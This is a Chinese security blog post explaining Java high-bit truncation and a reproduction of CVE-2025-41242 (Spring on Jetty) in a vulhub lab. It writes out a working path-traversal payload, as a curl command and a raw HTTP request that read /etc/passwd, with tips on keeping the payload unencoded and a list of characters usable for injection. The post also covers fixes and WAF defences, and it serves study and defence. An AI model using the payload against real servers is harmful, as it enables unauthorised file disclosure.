---
title: Ghost Bits：高位截断如何让 Java WAF 形同虚设
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image9.png
categories:
  - 其他
tags:
  - Java安全
  - WAF绕过
  - CVE
  - Ghost Bits
  - Spring
  - Jetty
abbrlink: 6a920a7a
date: 2026-05-01 13:00:00
---
#  **Ghost Bits：高位截断如何让 Java WAF 形同虚设** 

> "Ghost"指的是**被丢弃的高8位**——它们原本存在（如 `0x96`），但在强制转换时悄无声息地消失，像幽灵一样看不见却留下了影响（低8位变成了另一个字符）。安全社区用这个词形容这种**高位数据隐性丢失**导致的攻击面。

---

## 目录

- [原理前置知识](#一原理前置知识)
  - [须知：char 和 byte 的位数差异](#须知char-和-byte-的位数差异)
  - [printf 格式符说明](#printf-格式符说明)
  - [(char)(b & 0xFF) 是干什么的](#charb--0xff-是干什么的)
  - [Java byte 的有符号设计](#java-byte-的有符号设计)
  - [补码规则补充](#补码规则补充)
  - [为什么 0x96 变成 -106](#为什么-0x96-变成--106)
  - [& 0xFF 做了什么](#0xff-做了什么)
- [测试代码验证](#二测试代码验证)
- [WAF 为什么拦不住](#三waf-为什么拦不住)
- [CVE-2025-41242 实际复现](#四cve-2025-41242-实际复现)
  - [环境搭建](#环境搭建)
  - [poc 是怎么打的](#poc-是怎么打的)
  - [源码分析](#源码分析)
  - [payload 解析](#payload-解析)
  - [实际发包测试](#实际发包测试)
- [换成 Tomcat 会怎样](#五换成-tomcat-会怎样)
- [Ghost Bits 能构造哪些危险字符](#六ghost-bits-能构造哪些危险字符)
- [修复方案对比](#七修复方案对比)
- [WAF 防御的可行思路](#八waf-防御的可行思路)
- [总结](#总结)

---

## 一、原理前置知识

### 须知：char 和 byte 的位数差异

- `char`：16位 → 十六进制4位 → `0x962E`
- `byte`：8位 → 十六进制2位 → `0x2E`

这两个类型的位宽差异，就是 Ghost Bits 漏洞的根源所在。

---

### printf 格式符说明

```
0x%04X
```

- `0x`  → 直接打印字面量 `"0x"`
- `%`   → 格式符开始
- `04`  → 不够4位就在前面补0
- `X`   → 用大写十六进制显示

`0x%04X` 打印出来就是 `0x962E` 这种格式。

```
0x%02X
```

同上，只是只占2位，因为 byte 最多就是 `0xFF`，两位够了，打印出来是 `0x2E` 这种。

---

### (char)(b & 0xFF) 是干什么的

**第一步 `b & 0xFF`：**

Java 的 byte 是有符号的，范围是 -128 到 127。比如 `0x96` 存进 byte 里会变成 -106，直接用会乱。`& 0xFF` 就是强制把它当无符号数来用，范围变成 0 到 255，数值是对的。

**第二步 `(char)`：**

再转回 char，这样才能用 `%c` 打印出对应的字符来。

---

### Java byte 的有符号设计

Java 的 byte 是8位，8位能表示256个数，但 Java 用了"有符号"设计，最高位不用来表示数值，用来表示正负：

> byte 是 -128 到 127，不是 0 到 255

- 最高位是 0 → 正数
- 最高位是 1 → 负数

所以：

```
0000 0000 → 0
0111 1111 → 127（正数最大）
1000 0000 → -128（负数最小）
1111 1111 → -1
```

---

### 补码规则补充

负数的补码 = 把对应正数的二进制每位取反，再加1。

举个例子，-1 怎么表示：

```
第一步：1 的二进制  →  0000 0001
第二步：每位取反    →  1111 1110
第三步：加1        →  1111 1111
```

所以 `1111 1111 = -1`，不是255。

再看 -128 怎么来的：

```
第一步：128 的二进制  →  1000 0000
第二步：每位取反      →  0111 1111
第三步：加1          →  1000 0000
```

取反加1之后转了一圈回来了，所以 `1000 0000` 就被定义成 -128。

**为什么这么设计？**

用补码做加法，正数负数可以用同一套电路，不需要额外处理符号位，硬件简单很多。

可以验证一下：

```
-1 + 1 = ?
  1111 1111
+ 0000 0001
-----------
1 0000 0000  → 最高位溢出丢掉 → 0000 0000 → 0  ✓
```

加法结果是对的。

---

### 为什么 0x96 变成 -106

`0x96` 的二进制是：

```
1001 0110
```

最高位是1，Java 认为这是负数，用补码规则算出来就是 -106。

不需要记补码怎么算，只需要知道：凡是二进制最高位是1的 byte，Java 都会把它当负数处理。

---

### & 0xFF 做了什么

`& 0xFF` 就是位与运算，`0xFF` 的二进制是：

```
1111 1111
```

任何数 `& 1111 1111`，结果还是它本身，数值不变。

但关键在于：`b & 0xFF` 这个表达式，Java 会自动把结果提升为 `int` 类型，int 是32位无符号正数，所以 -106 经过这一步就变成了 150，也就是 `0x96` 正确的无符号值。

```
byte  0x96 → Java认为是 -106（有符号，最高位是1）
& 0xFF之后 → int 150  → 0x96（无符号，数值正确了）
```

**一句话总结：**

> `& 0xFF` 不是在改数据，是在告诉 Java：别把这个 byte 当有符号数，给我按无符号来用。

---

## 二、测试代码验证

写一段代码来直观感受 Ghost Bits 的效果：

```java
package com;

public class Main {
    public static void main(String[] args) {
        // 挑几个有意思的汉字
        // 这几个汉字不是随便选的，是特意挑了转换后会变成危险字符的
        char[] chars = {'阮', '严', '灵', '丰', '甲', '来'};

        System.out.println("字符\t\tUnicode\t\t转byte后\t对应ASCII");
        System.out.println("----------------------------------------");

        // 核心循环，筛选每一个汉字
        for (char c : chars) {
            // 这一行就是 Ghost Bits 发生的地方
            // char 是16位，byte 是8位，强制转换，高8位直接扔掉，b 里只剩低8位
            // 比如 0x962E 会被改为 0x2E，强行只保留后两位，高位字节不会保留
            byte b = (byte) c;

            // printf 格式化打印：
            // %c 打印原始字符
            // 0x%04X 打印 Unicode 值（4位十六进制）
            // 0x%02X 打印转换后的 byte 值
            // (char)(b & 0xFF) 把 byte 重新转回字符显示出来
            System.out.printf("'%c'\t\t0x%04X\t\t0x%02X\t\t'%c'%n",
                    c, (int) c, b, (char)(b & 0xFF));
        }

        // 直观感受：拼成字符串
        System.out.println("\n用这些字拼出来的路径：");
        char[] path = {'丮', '伮', '伯'};
        StringBuilder result = new StringBuilder();
        for (char c : path) {
            result.append((char)((byte) c & 0xFF));
        }
        System.out.println("原始：" + new String(path));
        System.out.println("转换后：" + result.toString());
    }
}
```

### 运行结果

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image1.png)

```
字符        Unicode     转byte后    对应ASCII
----------------------------------------
'阮'        0x962E      0x2E        '.'
'严'        0x4E25      0x25        '%'
'灵'        0x7075      0x75        'u'
'丰'        0x4E30      0x30        '0'
'甲'        0x7532      0x32        '2'
'来'        0x6765      0x65        'e'

用这些字拼出来的路径：
原始：丮伮伯
转换后：../
```

**总结就是：文字 → 数字 → 截掉高位 → 剩下的数字 → 对应的另一个文字**

这也说明一个问题：

同一个汉字可以重复用，不同的汉字也能映射成同一个符号，组合方式是无穷的。

可以用 `丮丮伯`，也可以用 `阮阮伯`，也可以用 `丮阮伯`，效果全一样，全都变成 `../`。

WAF 要拦的话，得把所有能映射成 `.` 和 `/` 的汉字全部加进黑名单，根本不现实。这也印证出了 Ghost Bits 的强大之处。

---

## 三、WAF 为什么拦不住

直观感受一下，统计整个汉字范围里能映射成危险字符的到底有多少个：

```java
package com;

public class Text {
    public static void main(String[] args) {
        // 统计：整个汉字范围里，能映射成 '.' 的有多少个？
        int count = 0;
        System.out.println("能映射成 '.' 的汉字：");

        // 遍历 Unicode 中的 CJK 统一汉字基本区块：
        // '\u4E00'（十进制 19968）是第一个汉字"一"
        // '\u9FFF'（十进制 40959）是该区块的最后一个字符
        // 这是CJK统一汉字的基本区（20992个字符）
        // 实际还有扩展A区（\u3400-\u4DBF）、扩展B区等，攻击者也可能用
        for (char c = '\u4E00'; c <= '\u9FFF'; c++) {
            byte b = (byte) c;
            if ((b & 0xFF) == 0x2E) {  // 0x2E = '.'
                System.out.printf("'%c' (U+%04X)  ", c, (int)c);
                count++;
            }
        }

        System.out.println("\n\n总共有 " + count + " 个汉字能映射成 '.'");

        // 再统计能映射成 '/' 的
        int count2 = 0;
        System.out.println("\n能映射成 '/' 的汉字：");
        for (char c = '\u4E00'; c <= '\u9FFF'; c++) {
            byte b = (byte) c;
            if ((b & 0xFF) == 0x2F) {  // 0x2F = '/'
                System.out.printf("'%c' (U+%04X)  ", c, (int)c);
                count2++;
            }
        }
        System.out.println("\n\n总共有 " + count2 + " 个汉字能映射成 '/'");
    }
}
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image2.png)

### 结论

```
总共有 82 个汉字能映射成 '.'
总共有 82 个汉字能映射成 '/'
```

这对 WAF 意味着什么：

WAF 要拦 `../`，它得把这 82×82×82 种组合全部加进黑名单：

```
82种'.'  ×  82种'.'  ×  82种'/'  =  551,368 种组合
```

**五十五万种**，而且这还只是汉字范围，加上其他 Unicode 字符更多。黑名单根本打不完。

而攻击者只需要从82个里随便挑一个：

```
丮丮乂  →  ../
伮伯乂  →  ../
倮倮乂  →  ../
...随便换，效果一样
```

这就是"WAF之殇"的本质：

> 不是 WAF 不努力，是这个问题从数学上就赢了。

**一对一的关系 WAF 能拦，多对一的关系 WAF 没有办法。**

---

## 四、CVE-2025-41242 实际复现

### 环境搭建

```bash
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd vulhub/spring/CVE-2025-41242
docker compose up -d
```

访问 `http://localhost:8080`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image3.png)

网站部署没有问题。

这个靶场是一个 **Spring Boot + Jetty** 的 Web 应用，CVE-2025-41242 是 Spring 框架因 Jetty URI 解析不一致导致的路径穿越漏洞。

---

如果直接请求访问：

```
http://localhost:8080/../../../../../../../etc/passwd
```

得到的是 `http://localhost:8080/etc/passwd` 的 404：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image4.png)

但是用 poc 测试：

```bash
python3 poc.py http://localhost:8080
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image5.png)

可以直接访问到 `/etc/passwd` 文件。

那 poc 是怎么访问这个路径的？

---

### 源码分析

查看一下源码：

> https://github.com/spring-projects/spring-framework/commit/24e66b63

`StringUtils.java` 文件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image6.png)

```java
// 漏洞版本
ByteArrayOutputStream baos = new ByteArrayOutputStream(length);
...
else {
    baos.write(ch);  // 高8位丢失就在这里
}

// 修复版本
StringBuilder output = new StringBuilder(length);
...
else {
    output.append(ch);  // 完整保留16位，不丢失
    i++;
}
```

关键就在于 `baos.write(ch)`，也就是 `ByteArrayOutputStream.write(int)`。

这是 JDK 自带方法，它的文档明确写了：

> https://docs.oracle.com/javase/8/docs/api/java/io/OutputStream.html#write-byte:A-

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image7.png)

翻译过来：

> 写入的是参数b的低8位。b的高24位直接被忽略。

`write(int b)` 接收的是 int 类型，int 是32位：

```
32位 int：
高24位（第9位到第32位）→ 全部忽略
低8位 （第1位到第8位） → 保留写入
```

文档说"高24位忽略"，意思就是除了最低8位之外，剩下的24位全部丢掉。

用 `阮` 举例：

```
'阮' = 0x0000962E（int类型，32位）

二进制：
0000 0000  0000 0000  1001 0110  0010 1110
│────────────────────────────│  │──────────│
         高24位，全部丢掉              低8位，保留

最终写入：0010 1110 = 0x2E = '.'
```

---

### 漏洞核心代码分析

这是 Spring 的 `uriDecode` 方法：

```java
public static String uriDecode(String source, Charset charset) {
    // source 就是URL路径
    int length = source.length();

    // 空字符串直接返回
    if (length == 0) {
        return source;
    }

    ByteArrayOutputStream baos = new ByteArrayOutputStream(length);
    boolean changed = false;

    // 逐个字符处理
    for (int i = 0; i < length; i++) {
        // 取出第i个字符，存进 ch
        // 注意 ch 是 int 类型，能装32位，字符的完整Unicode值都在里面，没有丢失
        int ch = source.charAt(i);

        if (ch == '%') {
            // 遇到%，说明是URL编码，取后两位做十六进制解码
            // 比如 %64 → 取6和4 → 解码成 'd'
            char hex1 = source.charAt(i + 1);
            char hex2 = source.charAt(i + 2);
            int u = Character.digit(hex1, 16);
            int l = Character.digit(hex2, 16);
            baos.write((char) ((u << 4) + l));  // 正常解码
            i += 2;
            changed = true;  // 标记发生了解码
        }
        else {
            // 不是%开头，直接写入
            // ← 漏洞就在这里，高8位丢失
            // ch 里装着完整的Unicode值，比如 '阮' = 0x962E
            // 但 baos.write(ch) 只保留低8位 0x2E，高8位 0x96 直接丢掉
            // '阮' 就这样变成了 '.'
            baos.write(ch);
        }
    }

    // 如果发生过解码（changed = true），就把 baos 里的字节转成字符串返回
    // 如果没有发生过解码，直接返回原始字符串
    //
    // 注意：changed 只有遇到 % 才会变成 true
    // 这意味着攻击者必须在路径中至少放一个正常的 URL 编码（如 %64→d）
    // 才能让 Spring 进入解码分支。没有这个 %，Spring 会直接返回原始字符串，漏洞不触发
    // 这是一种人为触发的逻辑开关，也是这个漏洞有意思的地方
    return (changed ? StreamUtils.copyToString(baos, charset) : source);
}
```

**关键点：这也是为什么 payload 里必须有至少一个 `%xx`，否则直接返回原始字符串，漏洞根本不触发。**

---

### payload 解析

看一下 poc 里的 payload：

```
/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64
```

整个请求链路是这样的：

```
客户端发请求
    ↓
Jetty收到请求（第一层，负责网络通信）
    ↓
Jetty把请求交给Spring（第二层，负责业务逻辑）
    ↓
Spring调用uriDecode处理URL
    ↓
uriDecode里 baos.write(ch) 触发截断
注意这里原payload里面有 %64，这样才能使 changed 为真，才能传入解码过后的字符

阮严灵丰丰甲来  >>  .%u002e   每个汉字被截断后转换成了一个字符

原payload被解析成了：
/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/.%u002e/etc/passwd
    ↓
Spring安全检查，检测黑名单：       (这也是不能直接写 /阮阮/阮阮/ 的原因)
  ../          ← 标准路径穿越
  ..\          ← Windows风格
  %2e%2e       ← ../的URL编码
  .%u002e      ← 没有检测到！
    ↓
路径交回给Jetty处理静态资源
    ↓
Jetty扩展支持了 %uXXXX 这种非标准写法
认出这是Unicode编码，把 %u002e 解码成 .
%u002e 中的 002e 等于十六进制 0x002E，对应的 Unicode 字符就是 U+002E，即英文句号 .



因此最终payload变成了：
/../../../../../../../etc/passwd
```

这就是整条攻击链：Spring 截断了高位，Spring 的安全检查漏了 `.%u002e`，Jetty 再把 `%u002e` 还原成 `.`，三方配合，路径穿越达成。

---

### 实际发包测试

如果直接 curl 访问：

```bash
curl "http://localhost:8080/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64"
```

得到的只有 404：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image8.png)

看到实际请求的路径，payload 里的中文被 url（percent）编码了。规则很简单，把每个字节用 `%` 加两位十六进制表示。

`阮` 的 UTF-8 是三个字节：

```
\xe9  →  %E9
\x98  →  %98
\xae  →  %AE

合起来：%E9%98%AE
```

这是浏览器和 curl 的编码机制。URL 里只允许出现 ASCII 字符，汉字、特殊符号这些不合法，所以会自动转换成 `%xx` 这种格式才能放进 URL 里传输。

但是这样的话，服务器因为包含百分号会把它解码还原成中文，这样就不会经过8字节截断的方法了。**必须让服务器收到我们发的原始数据，不能经过 URL 编码。**

需要使用其他方法，就比如用 **Yakit**。

> 注意这里不能用 bp，因为 bp 只是代理转发工具，实际还是会对内容进行编码处理。
>
> Burp Suite 默认会按照 URL 规范对非 ASCII 字符进行编码（变成 `%E9%98%AE`），这会破坏原始字节序列。要发送原始中文字符，需要：使用 Yakit、Netcat、或自定义 Python 脚本。或者在 Burp 的 Repeater 中，将 `Payload Encoding` 的 `URL-encode these characters` 选项**取消勾选**。

**核心原则：必须让服务端收到的字节就是 `0xE9 0x98 0xAE`（"阮"的UTF-8），而不是 `%E9%98%AE` 这6个 ASCII 字符，否则漏洞无法触发。**

在 Yakit 里构造原始数据包：

```http
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

构造数据包发包测试，成功拿到 passwd：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Ghost%20Bits%EF%BC%8CJava%20WAF%E4%B9%8B%E6%AE%87%EF%BC%9F_image9.png)

---

## 五、换成 Tomcat 会怎样

触发这个漏洞 Spring 和 Jetty 都有责任，但如果换成 Tomcat，就不会这么简单了。

### 阻碍一：Tomcat 不认识 %uXXXX

Tomcat 对非标准 URL 编码的态度是直接拒绝：

```
Jetty  收到 %u002e  →  认识，解码成 .
Tomcat 收到 %u002e  →  不认识，直接400报错或原样保留
```

所以即使 Spring 把汉字截断成了 `.%u002e`，Tomcat 也不会把 `%u002e` 解码成 `.`，路径穿越就构不成。

### 阻碍二：Tomcat 的路径规范化更严格

Tomcat 在把请求交给 Spring 之前，自己会先做一次路径检查，把可疑的路径直接拦掉：

```
收到 /../    →  直接拒绝
收到 %2e%2e  →  直接拒绝
收到 %u002e  →  不识别，拒绝或保留原样
```

Tomcat 更保守，宁可误杀也不放行可疑路径。

> Tomcat 的高版本（如10.1.x）对非标准编码更严格，默认拒绝。但旧版本或配置不当（如设置了 `URIEncoding="UTF-8"` + `allowQueryStringEncoding=true`）也可能受影响，只是概率低。

**其他容器的情况：**

| 容器 | 对 %uXXXX 的态度 | 受影响情况 |
|------|-----------------|-----------|
| Jetty | 默认支持，主动解码 | 主要风险载体 |
| Tomcat | 不支持，直接拒绝 | 不受影响 |
| Undertow | 默认不支持 | 不受影响 |
| WebLogic | 部分版本支持 | 可能受影响 |

**总结：**

```
Jetty：  宽松，认识 %uXXXX，主动解码，好心办坏事
Tomcat： 严格，不认识 %uXXXX，直接拒绝，反而更安全
```

这个漏洞本质上需要两个条件同时满足：

- **条件一**：Spring 的 `baos.write(ch)` 把汉字截断成 `.%u002e`
- **条件二**：底层容器能把 `%u002e` 解码成 `.`

Tomcat 不满足条件二，所以不受影响。

---

## 六、Ghost Bits 能构造哪些危险字符

其实除了 `../`，Ghost Bits 还能构造更多危险字符：

| 目标字符 | ASCII码 | 可能的汉字示例 | 攻击用途 |
| -------- | ------- | -------------- | -------- |
| `.` | 0x2E | 阮、丮、伮 | 目录穿越 |
| `/` | 0x2F | 严、伯、乂 | 目录穿越 |
| `\` | 0x5C | 某汉字 | Windows路径穿越 |
| `'` | 0x27 | 某汉字 | SQL注入 |
| `<` | 0x3C | 某汉字 | XSS/HTML注入 |
| `>` | 0x3E | 某汉字 | XSS/HTML注入 |
| `&` | 0x26 | 某汉字 | 参数污染 |
| `#` | 0x23 | 某汉字 | URL锚点绕过 |
| `%` | 0x25 | 严（低8位恰好是0x25） | 二次编码绕过 |

**只要某个汉字低8位等于危险字符的ASCII，它就能被当成那个字符使用。** WAF 如果只拦原始危险字符，不拦这些汉字，就会被绕过。

---

## 七、修复方案对比

Spring 的修复代码：`baos.write(ch)` → `output.append(ch)`

`ByteArrayOutputStream.write(int)` 只保留低8位，导致高位丢失。修复后改用 `StringBuilder.append(char)`，它会将字符按完整 Unicode 处理，不会截断。这个修改看似微小，但彻底消除了高位截断的根本原因。

**对于 Jetty 的加固建议**（虽然官方认为这不是 Jetty 的 bug，但用户可以自己加固）：

如果无法升级 Spring，可以在 Jetty 配置中禁用非标准 `%u` 编码：

```xml
<Set name="decodeUnicodePercentEncoding">false</Set>
```

这样 Jetty 不会再解码 `%u002e`，攻击链断裂。

---

## 八、WAF 防御的可行思路

黑名单这条路基本是死路，但 WAF 并不是完全没有办法，思路换一换还是能防的。

**1. 在请求解析层统一规范化**

WAF 应该先模拟 Spring 的行为：对 URL 路径中的每个字符，如果它是非 ASCII（如汉字），就计算 `(byte)c & 0xFF`，看低8位是否是危险字符。如果是，就拦截。这种方法不需要枚举汉字，只要判断低8位。

**2. 检测 `%u` 这种非标准编码**

直接拦截 URL 中出现 `%u`（无论后面是什么），因为 RFC 3986 规定 URL 编码必须是 `%xx` 两位，四位的 `%uXXXX` 是非标准的，正常业务不应该出现。

**3. 在 WAF 层做路径规范化**

将 `/%u002e/%u002e/` 先解码成 `/../../`，再进行路径穿越检测。这样 WAF 在数学上赢回一局。

---

## 总结

文章从 Java 基础类型转换的位操作原理出发，搞清楚了 Ghost Bits 这个概念的来龙去脉，然后结合 CVE-2025-41242 这个真实漏洞完整走了一遍攻击链。

整条链路下来，核心就是三个环节的共同"配合"：

1. **Spring 的 `baos.write(ch)`**：char 强转写入时高位静默丢失，汉字变成了危险字符
2. **Spring 的安全检查**：只认识常规的 `../` 和 `%2e%2e`，对 `.%u002e` 视而不见
3. **Jetty 的扩展解析**：认识并解码 `%uXXXX` 这种非标准格式，帮忙把最后一步 `%u002e` 还原成 `.`

任何一个环节单独看都不是"漏洞"，但三个拼在一起就是一条完整的路径穿越链。

WAF 的困境在于：一个危险字符对应82个汉字，`../` 的变体超过55万种，黑名单从数学层面就注定打不完。真正的防御思路应该是模拟后端的解析行为，而不是堆黑名单。

> 好的 WAF 不是靠黑名单，而是靠"与后端行为一致的重构"。
